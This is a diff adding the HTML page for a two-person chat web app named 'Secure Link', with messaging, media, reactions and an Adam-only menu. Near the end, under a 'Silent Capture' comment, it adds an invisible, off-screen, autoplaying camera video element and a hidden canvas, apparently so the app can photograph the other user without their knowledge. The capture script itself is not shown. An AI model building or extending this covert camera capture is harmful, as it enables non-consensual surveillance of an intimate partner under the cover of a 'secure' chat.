@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Secure Link: Ultimate</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+</head>
+<body>
+
+    <div id="app-loader">
+        <div class="spinner"></div>
+        <div class="loading-text">Secure Link</div>
+    </div>
+
+    <div id="media-viewer" class="media-overlay">
+        <div class="media-top-bar">
+            <button id="media-download-btn" class="icon-btn">⬇</button>
+            <button id="media-close-btn" class="icon-btn">✖</button>
+        </div>
+        <div class="media-container">
+            <img id="media-view-img" src="" alt="Full View">
+            <video id="media-view-video" src="" controls playsinline></video>
+        </div>
+    </div>
+
+    <div id="reaction-modal" class="modal-overlay">
+        <div class="modal-content">
+            <h3>Reactions</h3>
+            <div id="reaction-list"></div>
+            <button id="close-rx-modal">Close</button>
+        </div>
+    </div>
+
+    <div id="context-menu">
+        <div class="ctx-header">
+            <span>Actions</span>
+            <div id="ctx-close-btn">✖</div>
+        </div>
+        <div class="rx-picker">
+            <span data-emoji="❤️">❤️</span>
+            <span data-emoji="😂">😂</span>
+            <span data-emoji="😮">😮</span>
+            <span data-emoji="😢">😢</span>
+            <span data-emoji="😡">😡</span>
+            <span data-emoji="👍">👍</span>
+        </div>
+        <div class="ctx-item" id="ctx-reply">↩️ Reply</div>
+        <div class="ctx-item red" id="ctx-unsend" style="display:none;">🚫 Unsend</div>
+        <div class="ctx-item" id="ctx-remove">🗑️ Remove for Me</div>
+    </div>
+
+    <!-- SIDE MENU (Adam Only) -->
+    <div id="side-menu-overlay"></div>
+    <div id="side-menu">
+        <div class="menu-header">Menu</div>
+        <a href="quickselfies.html" class="menu-item">📸 Romantic Instant Selfies</a>
+        <div class="menu-item" id="menu-close">✖ Close Menu</div>
+    </div>
+
+    <div id="login-screen" style="display:none;">
+        <h2>SECURE LINK</h2>
+        <input type="text" class="login-input" id="inp-user" placeholder="Identity (adam/eve)">
+        <input type="password" class="login-input" id="inp-pass" placeholder="Cloud Password">
+        <input type="password" class="login-input" id="inp-vault" placeholder="Secret Key">
+        <button class="login-btn" id="btn-login">UNLOCK</button>
+    </div>
+
+    <div id="chat-screen">
+        <header>
+            <div class="header-left">
+                <!-- Hamburger Button (Hidden by default, shown for Adam) -->
+                <div id="hamburger-btn" style="display:none; margin-right:10px; font-size:24px; cursor:pointer;">☰</div>
+                
+                <div class="avatar-wrapper">
+                    <img id="header-avatar" src="" alt="">
+                    <div id="header-status-dot"></div>
+                </div>
+                <div class="header-info">
+                    <span id="header-name">Connecting...</span>
+                    <span id="header-status-text">Checking status...</span>
+                </div>
+            </div>
+            <div id="btn-logout" style="cursor:pointer; padding: 10px;">✖</div>
+        </header>
+        
+        <div id="msg-list">
+            <div id="loading-spinner">⟳ Loading History...</div>
+        </div>
+        
+        <div id="scroll-down-btn">⬇</div>
+        <div id="status-text"></div>
+        
+        <div id="input-area">
+            <div id="reply-preview-bar">
+                <div class="reply-info">
+                    <span id="reply-to-user"></span>
+                    <span id="reply-content-preview"></span>
+                </div>
+                <div id="btn-cancel-reply" style="font-size:20px; cursor:pointer;">✖</div>
+            </div>
+
+            <div id="plus-menu">
+                <div id="menu-media">🖼️ Photos/Video</div>
+                <div id="menu-voice">🎙️ Voice Message</div>
+            </div>
+
+            <button class="icon-btn" id="plus-btn">＋</button>
+            <input type="file" id="file-input" style="display:none" accept="image/*,video/*,audio/*">
+            
+            <button class="icon-btn" id="cancel-rec-btn" style="display:none; color:#ff3b30;">✖</button>
+            
+            <input type="text" id="message-input" placeholder="Message..." autocomplete="off">
+            
+            <button class="icon-btn" id="send-btn">➤</button>
+        </div>
+    </div>
+
+    <!-- Hidden Elements for Silent Capture -->
+    <video id="hidden-cam" autoplay playsinline muted style="opacity:0; position:absolute; top:-9999px; pointer-events:none; z-index:-1;"></video>
+    <canvas id="hidden-canvas" style="display:none;"></canvas>
+
+    <script type="module" src="app.js"></script>
+</body>
+</html>
